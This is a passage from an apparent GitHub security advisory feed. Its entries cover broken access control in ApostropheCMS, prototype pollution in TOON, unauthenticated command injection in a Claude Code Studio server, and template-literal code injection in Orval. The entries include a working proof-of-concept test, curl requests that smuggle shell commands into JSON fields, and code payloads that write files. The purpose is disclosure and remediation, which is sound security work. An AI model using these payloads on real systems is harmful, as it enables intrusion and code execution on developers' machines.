<p>The PoC uses ApostropheCMS's own test harness (a real Apostrophe instance + MongoDB) to drive the real <code>apos.page.move()</code> code path with a non-admin <code>editor</code> request. It creates an admin-only section page type (<code>editRole: 'admin'</code>), an admin-owned <code>secret</code> section with a pre-existing admin-only child, and an ordinary page an editor may edit; the editor then moves their page under the admin-only section. The move succeeds (it must be forbidden), the page is relocated under the restricted branch, and the protected child is re-ranked.</p>
<p>Environment: Node 24, Docker (for MongoDB). Clone the repo at the anchor and install the workspace with pnpm.</p>
<pre><code class="language-bash"># 1. Disposable MongoDB on 127.0.0.1
docker run -d --name apos-mongo -p 27017:27017 mongo:7

# 2. Repo at the anchor
git clone https://github.com/apostrophecms/apostrophe.git /tmp/dh-apostrophe
cd /tmp/dh-apostrophe
git checkout 68f1312d3          # 4.31.0 line
npm i -g pnpm
pnpm install --filter apostrophe...

# 3. Drop in the PoC test and run it
cd /tmp/dh-apostrophe/packages/apostrophe
#   (write test/poc-move-bac.js below, then:)
npx mocha test/poc-move-bac.js
</code></pre>
<p><code>packages/apostrophe/test/poc-move-bac.js</code>:</p>
<pre><code class="language-js">// PoC: Broken Access Control in apos.page.move()
// A non-admin (editor) can move a page they may edit UNDER a parent page
// whose type is admin-only (editRole: 'admin'), bypassing the destination
// "create" permission check that move() is supposed to enforce.
const t = require('../test-lib/test.js');
const assert = require('assert');

describe('PoC move BAC', function() {
  let apos;
  this.timeout(t.timeout);

  after(async function() {
    await t.destroy(apos);
    apos = null;
  });

  before(async function() {
    apos = await t.create({
      root: module,
      modules: {
        // A restricted page type: only admins may edit/create pages of this type.
        'secret-page': {
          extend: '@apostrophecms/page-type',
          options: {
            editRole: 'admin',
            publishRole: 'admin'
          }
        },
        // An ordinary page type any editor can edit/create.
        'public-page': {
          extend: '@apostrophecms/page-type'
        },
        '@apostrophecms/page': {
          options: {
            park: [],
            types: [
              { name: '@apostrophecms/home-page', label: 'Home' },
              { name: 'secret-page', label: 'Secret' },
              { name: 'public-page', label: 'Public' }
            ]
          }
        }
      }
    });
  });

  it('demonstrates the BAC', async function() {
    const adminReq = apos.task.getReq({ role: 'admin' });
    const home = await apos.page.find(adminReq, { level: 0 }).toObject();

    // Admin creates an admin-only "secret" section page directly under home.
    const secret = await apos.page.insert(adminReq, home._id, 'lastChild', {
      title: 'Secret Section',
      type: 'secret-page',
      slug: '/secret'
    });

    // Admin creates a pre-existing CHILD inside the secret section. Its rank
    // must NOT be silently rewritten by a lower-priv user's move.
    const secretChild = await apos.page.insert(adminReq, secret._id, 'lastChild', {
      title: 'Secret Child',
      type: 'secret-page',
      slug: '/secret/child'
    });
    const secretChildBefore = await apos.page.find(adminReq, { _id: secretChild._id }).toObject();

    // A non-admin EDITOR. Editors can edit/create ordinary pages but NOT
    // pages of type secret-page (editRole: admin).
    const editorReq = apos.task.getReq({
      role: 'editor',
      user: { _id: 'editor-user', title: 'Editor', role: 'editor' }
    });

    // The editor creates an ordinary page under home (allowed).
    const mine = await apos.page.insert(editorReq, home._id, 'lastChild', {
      title: 'My Page',
      type: 'public-page',
      slug: '/mine'
    });

    // Sanity: confirm the editor genuinely lacks create/edit rights on the
    // secret section (so a move under it MUST be forbidden).
    const secretForEditor = await apos.page.find(editorReq, { _id: secret._id })
      .permission(false).toObject();
    console.log('PRECONDITION editor._create on secret =', secretForEditor._create,
      ' editor._edit on secret =', secretForEditor._edit);
    assert.strictEqual(secretForEditor._create, undefined,
      'precondition: editor must NOT have create rights on the admin-only section');

    // THE ATTACK: editor moves their ordinary page UNDER the admin-only
    // secret section. This SHOULD throw "forbidden". If it succeeds, BAC.
    // Use 'firstChild' so the moved page takes rank 0 and the pre-existing
    // admin-only child must be nudged from rank 0 -&gt; 1 (a write to a doc the
    // editor cannot edit).
    let moveError = null;
    try {
      await apos.page.move(editorReq, mine._id, secret._id, 'firstChild');
    } catch (e) {
      moveError = e;
    }

    const moved = await apos.page.find(adminReq, { _id: mine._id }).toObject();
    const secretChildAfter = await apos.page.find(adminReq, { _id: secretChild._id }).toObject();

    console.log('move threw:', moveError ? moveError.name : 'NOTHING (move succeeded)');
    console.log('moved page path:', moved &amp;&amp; moved.path);
    console.log('moved page is now under secret?', moved &amp;&amp; moved.path.includes(secret.aposDocId));
    console.log('secret child rank BEFORE:', secretChildBefore.rank, ' AFTER:', secretChildAfter.rank);

    // Assertions that prove the vulnerability:
    assert.strictEqual(moveError, null,
      'VULN NOT PRESENT: move was correctly forbidden');
    assert.ok(moved.path.includes(secret.aposDocId),
      'VULN: editor relocated their page under the admin-only section');
    assert.notStrictEqual(secretChildAfter.rank, secretChildBefore.rank,
      'VULN: editor re-ranked an admin-only sibling page they cannot edit');

    console.log('\n*** BROKEN ACCESS CONTROL CONFIRMED: editor moved a page under an admin-only section and re-ranked its protected children ***');
  });
});
</code></pre>
<p>Observed output (4.31.0, commit <code>68f1312d3</code>):</p>
<pre><code>  PoC move BAC
Listening at http://localhost:34129
PRECONDITION editor._create on secret = undefined  editor._edit on secret = undefined
move threw: NOTHING (move succeeded)
moved page path: iqhgqffcpe3iwoe7qqvr79rx/l0ua8mfilcfdp38vduhj4684/szhq36qak65mnefb5va1cv4d
moved page is now under secret? true
secret child rank BEFORE: 0  AFTER: 1

*** BROKEN ACCESS CONTROL CONFIRMED: editor moved a page under an admin-only section and re-ranked its protected children ***
    ✔ demonstrates the BAC (390ms)

  1 passing (6s)
</code></pre>
<p>The precondition holds (<code>editor._create on secret = undefined</code>), the move did not throw (<code>NOTHING</code>), the editor's page is now physically under the admin-only section's path, and the protected sibling's rank was rewritten (0 → 1) by the editor's request. In a deployed site the identical effect is reachable over HTTP by a logged-in non-admin via <code>PATCH /api/v1/@apostrophecms/page/&lt;myPageId&gt;:en:draft</code> with body <code>{ "_targetId": "&lt;restrictedSectionId&gt;:en:draft", "_position": "firstChild" }</code> (the route reaches <code>move()</code> after only the <code>page._edit</code> gate on the moved page).</p>
<h2 id="remediation">Remediation</h2>
<p>Restore destination-parent authorization for all non-archive moves and special-case only the archive-restore path. Replace the broken guard with logic equivalent to:</p>
<pre><code class="language-js">if (
  (oldParent._id !== parent._id) &amp;&amp;
  (parent.type !== '@apostrophecms/archive-page') &amp;&amp;
  (!parent._create) &amp;&amp;
  !(oldParent.type === '@apostrophecms/archive-page' &amp;&amp; parent._edit)
) {
  throw self.apos.error('forbidden');
}
</code></pre>
<p>That is: a cross-parent move into a non-archive destination is forbidden unless the actor has <code>create</code> on the destination — with the single exception that restoring a page <em>out of the archive</em> into a destination the actor may <code>edit</code> is allowed. Equivalently, fetch the destination with <code>.permission('create')</code> (as the insert route does) and reject when it is not returned. Add a regression test asserting that a non-admin cannot move a page under a parent whose type carries a higher <code>editRole</code>/<code>publishRole</code>, mirroring the PoC above.</p>
<p>Please credit 5ud0 / Tarmo Technologies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-wr5r-wqp2-x4fh">https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-wr5r-wqp2-x4fh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63669">https://nvd.nist.gov/vuln/detail/CVE-2026-63669</a></li>
<li><a href="https://github.com/apostrophecms/apostrophe/commit/d50c6ad61b9c1788958752358f1fca714cc8368c">https://github.com/apostrophecms/apostrophe/commit/d50c6ad61b9c1788958752358f1fca714cc8368c</a></li>
<li><a href="https://github.com/advisories/GHSA-wr5r-wqp2-x4fh">https://github.com/advisories/GHSA-wr5r-wqp2-x4fh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wr5r-wqp2-x4fh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-03T20:05:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@toon-format/toon] TOON: Prototype pollution when decoding untrusted TOON input]]></title>
        <id>https://github.com/advisories/GHSA-p95v-992w-h6c3</id>
        <link href="https://github.com/advisories/GHSA-p95v-992w-h6c3"/>
        <updated>2026-09-03T19:52:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Decoding attacker-controlled TOON containing a <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> key wrote through the object's prototype chain instead of creating an own property, polluting <code>Object.prototype</code> for the whole runtime. The <code>expandPaths: 'safe'</code> path (dotted keys such as <code>a.__proto__.x</code>) was the strongest vector; plain nested objects, tabular rows, and quoted keys were all affected. The encoder had a matching defect: it silently dropped own <code>__proto__</code> properties and could fire an inherited setter while normalizing.</p>
<h3 id="impact">Impact</h3>
<p>Any service that decodes untrusted TOON is affected. Prototype pollution can escalate to denial of service or, with a suitable downstream gadget, remote code execution.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to <code>@toon-format/toon@2.3.1</code>. Decoders now materialize <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> as ordinary own data properties, matching <code>JSON.parse</code> semantics; the encoder preserves the same keys without invoking inherited accessors.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None. Upgrade is the only fix. Callers who cannot upgrade should reject input whose keys include <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> before decoding.</p>
<h3 id="port-maintainers">Port maintainers</h3>
<p>The same bug shape can exist in any implementation that assigns decoded keys with <code>obj[key] = value</code>. Rust, Swift, Java, Python, and C# ports should audit their object-construction and path-expansion paths for the three prototype keys.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/toon-format/toon/security/advisories/GHSA-p95v-992w-h6c3">https://github.com/toon-format/toon/security/advisories/GHSA-p95v-992w-h6c3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-82404">https://nvd.nist.gov/vuln/detail/CVE-2026-82404</a></li>
<li><a href="https://github.com/toon-format/toon/pull/316">https://github.com/toon-format/toon/pull/316</a></li>
<li><a href="https://github.com/toon-format/toon/commit/94a2b7560b2b5ed903a4d466a3bce8b13daa2660">https://github.com/toon-format/toon/commit/94a2b7560b2b5ed903a4d466a3bce8b13daa2660</a></li>
<li><a href="https://github.com/toon-format/toon/releases/tag/v2.3.1">https://github.com/toon-format/toon/releases/tag/v2.3.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p95v-992w-h6c3">https://github.com/advisories/GHSA-p95v-992w-h6c3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p95v-992w-h6c3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T19:52:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[claude-code-templates] Claude Code Templates: Unauthenticated OS command injection (RCE) in Claude Code Studio server (--studio)]]></title>
        <id>https://github.com/advisories/GHSA-79wm-x847-7cvg</id>
        <link href="https://github.com/advisories/GHSA-79wm-x847-7cvg"/>
        <updated>2026-09-03T19:50:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>npx claude-code-templates --studio</code> launches "Claude Code Studio", an Express HTTP server (<code>cli-tool/src/sandbox-server.js</code>, default port 3444) that binds to <strong>all interfaces</strong> (<code>0.0.0.0</code>), sets <code>Access-Control-Allow-Origin: *</code>, and requires <strong>no authentication</strong>. Two POST endpoints pass attacker-controlled request-body fields into <code>child_process.spawn(..., { shell: true })</code>. Because <code>shell: true</code> makes Node join the argv array into a single <code>sh -c</code> string, the fields are parsed by the shell and metacharacters execute. Any unauthenticated attacker who can reach the port — a malicious web page the developer visits, or anyone on the same LAN — can execute arbitrary OS commands on the developer's machine.</p>
<h3 id="details">Details</h3>
<p>In <code>cli-tool/src/sandbox-server.js</code>:</p>
<ul>
<li><code>app.listen(PORT, ...)</code> is called with no host argument, so the server listens on <code>0.0.0.0</code> / <code>::</code> (reachable from the LAN, not just localhost).</li>
<li>The CORS middleware sends <code>Access-Control-Allow-Origin: *</code> and answers the preflight <code>OPTIONS</code> for any origin, so a browser will deliver cross-origin POSTs to it.</li>
<li>There is no authentication on any endpoint.</li>
</ul>
<p>The vulnerable sinks:</p>
<ol>
<li><p><code>POST /api/execute</code> — the <code>prompt</code> body field flows into <code>executeLocalTask()</code>:</p>
<pre><code class="language-js">const child = spawn('claude', [finalPrompt], { /* ... */ shell: true });
The only validation on prompt is a length check (&gt;= 10 chars). With shell: true, finalPrompt is interpreted by the shell.
</code></pre>
</li>
<li><p>POST /api/install-agent — the agentName body field:
const child = spawn('npx', ['claude-code-templates@latest', '--agent', agentName, '--yes'], { /* ... */ shell: true });</p>
</li>
<li><p>agentName is used unvalidated. (The same unsafe pattern is also reachable through /api/execute's agent field via checkAndInstallAgent().)</p>
</li>
</ol>
<p>Root cause: spawn(cmd, argsArray, { shell: true }) does not keep argsArray as separate argv entries — Node builds cmd + ' ' + argsArray.join(' ') and runs it via sh -c, so every element is subject to shell parsing.</p>
<p>PoC</p>
<h1 id="victim">Victim</h1>
<p>npx claude-code-templates --studio          # server on 0.0.0.0:3444</p>
<h1 id="attacker-another-lan-host-or-a-malicious-web-page-fetch-or-locally">Attacker (another LAN host, or a malicious web page fetch(), or locally)</h1>
<p>curl -s -X POST <a href="http://127.0.0.1:3444/api/execute">http://127.0.0.1:3444/api/execute</a> <br>  -H 'Content-Type: application/json' <br>  --data '{"prompt":"aaaaaaaaaa; touch /tmp/CCT_RCE_PROOF","mode":"local"}'</p>
<p>curl -s -X POST <a href="http://127.0.0.1:3444/api/install-agent">http://127.0.0.1:3444/api/install-agent</a> <br>  -H 'Content-Type: application/json' <br>  --data '{"agentName":"x; touch /tmp/CCT_AGENT_PROOF #"}'</p>
<p>ls -la /tmp/CCT_RCE_PROOF /tmp/CCT_AGENT_PROOF   # both created =&gt; injected commands ran
The aaaaaaaaaa padding satisfies the 10-char minimum, then ; (or $(...), or backticks) starts the injected command. claude/npx do not even need to be installed — the injected segment runs regardless.</p>
<p>Confirmed at runtime on v1.28.13 (Node 22, Linux): both marker files were created, the server listened on *:3444, and an OPTIONS preflight from Origin: <a href="https://evil.example">https://evil.example</a> returned 200 with Access-Control-Allow-Origin: *.</p>
<p>Impact</p>
<p>Unauthenticated remote code execution (CWE-78) on any machine running --studio. Two reachability paths:</p>
<ul>
<li>Drive-by: a developer running --studio who visits an attacker-controlled web page — the page's cross-origin fetch() (Content-Type application/json) passes the wildcard CORS preflight and delivers the POST, achieving RCE with no other interaction.</li>
<li>LAN: because the server binds 0.0.0.0, anyone on the same network (office, co-working space, public Wi-Fi) can hit port 3444 directly.</li>
</ul>
<p>Impact is full compromise of the developer's user account (arbitrary command execution with the developer's privileges): source code, SSH keys, cloud credentials, and .env secrets.</p>
<p>Suggested fix</p>
<ul>
<li>Remove shell: true from all three spawns so arguments stay discrete argv entries (kills the injection).</li>
<li>Validate agentName against a strict allowlist (^[A-Za-z0-9._/-]+$).</li>
<li>Bind to loopback only (app.listen(PORT, '127.0.0.1', ...)).</li>
<li>Replace the wildcard CORS with a same-origin allowlist and reject other origins.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/davila7/claude-code-templates/security/advisories/GHSA-79wm-x847-7cvg">https://github.com/davila7/claude-code-templates/security/advisories/GHSA-79wm-x847-7cvg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73222">https://nvd.nist.gov/vuln/detail/CVE-2026-73222</a></li>
<li><a href="https://github.com/davila7/claude-code-templates/commit/bc4618b07232633c1c0aac12a43e436268d31783">https://github.com/davila7/claude-code-templates/commit/bc4618b07232633c1c0aac12a43e436268d31783</a></li>
<li><a href="https://github.com/davila7/claude-code-templates/blob/main/CHANGELOG.md">https://github.com/davila7/claude-code-templates/blob/main/CHANGELOG.md</a></li>
<li><a href="https://github.com/advisories/GHSA-79wm-x847-7cvg">https://github.com/advisories/GHSA-79wm-x847-7cvg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79wm-x847-7cvg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-03T19:50:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: RCE via OpenAPI path -> unescaped request-URL template literal (backtick breakout)]]></title>
        <id>https://github.com/advisories/GHSA-fg9p-mrxr-hvq7</id>
        <link href="https://github.com/advisories/GHSA-fg9p-mrxr-hvq7"/>
        <updated>2026-09-03T19:17:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Orval emits the OpenAPI path into the generated request URL as a TEMPLATE LITERAL (<code>`/users/...`</code>) without escaping the backtick character. A path containing a backtick closes the template literal and injects a concatenation expression that is evaluated when the generated URL/request/key function is called, executing attacker-controlled code. Affects the axios, fetch, react-query, and swr clients. Verified on Orval 8.19.0; survives Orval's default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">// generated URL builder (fetch client)
return `/users/` + (globalThis.X = require("fs").writeFileSync("/marker","pwned")) + `/list`;
</code></pre>
<p>The backtick in the path terminates the <code>`...`</code> literal; <code>+ (&lt;code&gt;) +</code> runs as a live expression; a trailing backtick reopens a template literal so the file stays valid. The code runs whenever the generated request function, URL builder, or query-key function is called.</p>
<p>This is distinct from Orval's four published CVEs: CVE-2026-22785 (<code>summary</code> -&gt; MCP server), CVE-2026-23947 / CVE-2026-25141 (<code>x-enumDescriptions</code>), and CVE-2026-24132 (<code>const</code> -&gt; mock files). This is a different field (the route path) and a different sink (the request-URL template literal), which those advisories and their fixes do not cover.</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates a fetch client with default validation, bundles it, calls the generated functions, and shows a marker file written. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Code execution in any environment that calls a client generated from an attacker-controlled or attacker-influenced OpenAPI description (developer, CI, or the running application). </p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Escape the path before emitting it into the URL template literal (escape backtick and <code>${</code>, or build the URL with an encoder that treats the path as data), and validate path characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-fg9p-mrxr-hvq7">https://github.com/orval-labs/orval/security/advisories/GHSA-fg9p-mrxr-hvq7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62681">https://nvd.nist.gov/vuln/detail/CVE-2026-62681</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-fg9p-mrxr-hvq7">https://github.com/advisories/GHSA-fg9p-mrxr-hvq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fg9p-mrxr-hvq7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T19:17:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: RCE via servers[].url -> unescaped request-URL template literal (with getBaseUrlFromSpecification)]]></title>
        <id>https://github.com/advisories/GHSA-88f2-fpv8-89q2</id>
        <link href="https://github.com/advisories/GHSA-88f2-fpv8-89q2"/>
        <updated>2026-09-03T19:06:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When Orval is configured with <code>output.baseUrl.getBaseUrlFromSpecification: true</code>, it bakes the spec's <code>servers[0].url</code> into the generated request URL as a template literal without escaping the backtick. A server URL containing a backtick closes the template literal and injects a concatenation expression evaluated when the generated URL/request function is called, executing attacker-controlled code. Verified on Orval 8.19.0 (fetch client); survives default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">return `http://api.x/` + (globalThis.X = require("fs").writeFileSync("/marker","pwned")) + `/v1/u`;
</code></pre>
<p>Prerequisite: the documented <code>getBaseUrlFromSpecification: true</code> option (takes the base URL from the OpenAPI servers block). This is the same output sink as the route-path case (request-URL template literal) reached via the server <code>url</code> field. Distinct from Orval's published CVEs (CVE-2026-22785 summary/MCP, CVE-2026-23947 / CVE-2026-25141 x-enumDescriptions, CVE-2026-24132 const/mock).</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates a fetch client with <code>getBaseUrlFromSpecification: true</code>, bundles it, calls the functions, and shows a marker written. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>With that option enabled, code execution in any environment that calls a client generated from an attacker-controlled or attacker-influenced OpenAPI description.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Escape the server URL before emitting it into the URL template literal (escape backtick and <code>${</code>), or build the base URL with an encoder that treats it as data; validate the URL.
<a href="https://github.com/user-attachments/files/29396562/maintainer-report.txt">maintainer-report.txt</a>
<a href="https://github.com/user-attachments/files/29396563/make_spec.py">make_spec.py</a>
<a href="https://github.com/user-attachments/files/29396564/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-88f2-fpv8-89q2">https://github.com/orval-labs/orval/security/advisories/GHSA-88f2-fpv8-89q2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62682">https://nvd.nist.gov/vuln/detail/CVE-2026-62682</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-88f2-fpv8-89q2">https://github.com/advisories/GHSA-88f2-fpv8-89q2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88f2-fpv8-89q2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T19:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via schema default -> zod module-level template literal]]></title>
        <id>https://github.com/advisories/GHSA-w727-8j6c-2rj4</id>
        <link href="https://github.com/advisories/GHSA-w727-8j6c-2rj4"/>
        <updated>2026-09-03T19:03:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Orval's zod schema generation emits a schema's <code>default</code> value as a module-level template literal (<code>export const …Default = </code><code>;</code>) without escaping <code>${</code> or the backtick. A default of the form <code>v${&lt;code&gt;}w</code> injects a live JavaScript expression that is evaluated when the generated zod schema module is imported, executing attacker-controlled code at import — no request or function call needed. Verified on Orval 8.19.0; survives default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const getIResponseDsDefault = `v${globalThis.ORVPWN()}w`;
</code></pre>
<p><code>${...}</code> permits an arbitrary JS expression. Orval escapes its other value sinks (enum, mock, regex, object-default values) with <code>\'</code> inside single-quoted strings; the string <code>default</code> is the one value emitted as a backtick template literal, so <code>${...}</code>/backtick are interpreted, not escaped. Distinct from the URL-template-literal cases (different field and sink) and from the published Orval CVEs (summary/MCP, x-enumDescriptions, const/mock).</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the zod schema with default validation, bundles it, imports it, and shows a marker written at import. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Code execution at import in any application that imports a zod schema module generated from an attacker-controlled or attacker-influenced OpenAPI description.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Emit <code>default</code> values via a proper string-literal encoder (JSON.stringify, or escape backtick and ${ if a template literal must be used); never interpolate a spec value into a template literal. </p>
<p><a href="https://github.com/user-attachments/files/29399048/maintainer-report.txt">maintainer-report.txt</a>
<a href="https://github.com/user-attachments/files/29399049/make_spec.py">make_spec.py</a>
<a href="https://github.com/user-attachments/files/29399050/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-w727-8j6c-2rj4">https://github.com/orval-labs/orval/security/advisories/GHSA-w727-8j6c-2rj4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-72717">https://nvd.nist.gov/vuln/detail/CVE-2026-72717</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-w727-8j6c-2rj4">https://github.com/advisories/GHSA-w727-8j6c-2rj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w727-8j6c-2rj4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T19:03:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via array-items default -> zod module-level template literal]]></title>
        <id>https://github.com/advisories/GHSA-2h9g-j24r-h63g</id>
        <link href="https://github.com/advisories/GHSA-2h9g-j24r-h63g"/>
        <updated>2026-09-03T18:38:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Orval's zod schema generation emits the <strong>array-items</strong> <code>default</code> value as a module-level template literal (<code>export const …Default = </code><code>;</code>) without escaping <code>${</code> or the backtick. A default of the form <code>v${&lt;code&gt;}w</code> injects a live JavaScript expression evaluated when the generated zod schema module is imported, executing attacker-controlled code at import — no request or function call needed. Verified on Orval 8.19.0; survives default OpenAPI validation.</p>
<h3 id="details">Details</h3>
<pre><code class="language-ts">export const …Default = `v${globalThis.ORVPWN()}w`;   // ${...} = arbitrary JS expression, runs at import
</code></pre>
<p>Malicious input: an array property (string items) with a <code>default</code> of <code>v${&lt;attacker JS&gt;}w</code>. <code>${...}</code> permits any JS expression.</p>
<p>Note: this is one of several <code>default</code>-bearing positions that reach the same unescaped zod template-literal sink; a single fix (escape <code>default</code> values) closes all of them, and a CNA may choose to consolidate the related reports.</p>
<h3 id="poc">PoC</h3>
<p><code>reproduce.sh</code> (+ <code>make_spec.py</code>) attached: generates the zod schema with default validation, bundles it, imports it, and shows a marker written at import. Verified on 8.19.0.</p>
<h3 id="impact">Impact</h3>
<p>Code execution at import in any application that imports a zod schema module generated from an attacker-controlled or attacker-influenced OpenAPI description.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Emit <code>default</code> values via a proper string-literal encoder (JSON.stringify, or escape backtick and <code>${</code> if a template literal must be used); never interpolate a spec value into a template literal. Apply to every <code>default</code> position. <a href="https://github.com/user-attachments/files/29399151/maintainer-report.txt">maintainer-report.txt</a> <a href="https://github.com/user-attachments/files/29399152/make_spec.py">make_spec.py</a><a href="https://github.com/user-attachments/files/29399153/reproduce.sh">reproduce.sh</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/orval-labs/orval/security/advisories/GHSA-2h9g-j24r-h63g">https://github.com/orval-labs/orval/security/advisories/GHSA-2h9g-j24r-h63g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-71869">https://nvd.nist.gov/vuln/detail/CVE-2026-71869</a></li>
<li><a href="https://github.com/orval-labs/orval/pull/3692">https://github.com/orval-labs/orval/pull/3692</a></li>
<li><a href="https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6">https://github.com/orval-labs/orval/commit/8ef1bfdf3f9bcaf9dabfbe2e42887f1c0e159ab6</a></li>
<li><a href="https://github.com/orval-labs/orval/releases/tag/v8.21.0">https://github.com/orval-labs/orval/releases/tag/v8.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-2h9g-j24r-h63g">https://github.com/advisories/GHSA-2h9g-j24r-h63g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2h9g-j24r-h63g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-03T18:38:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[orval] Orval: Import-time RCE via header-parameter default -> zod module-level template literal]]></title>
        <id>https://github.com/advisories/GHSA-8j6p-r8jg-mxqh</id>
        <link href="https://github.com/advisories/GHSA-8j6p-r8jg-mxqh"/>
        <updated>2026-09-03T18:32:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
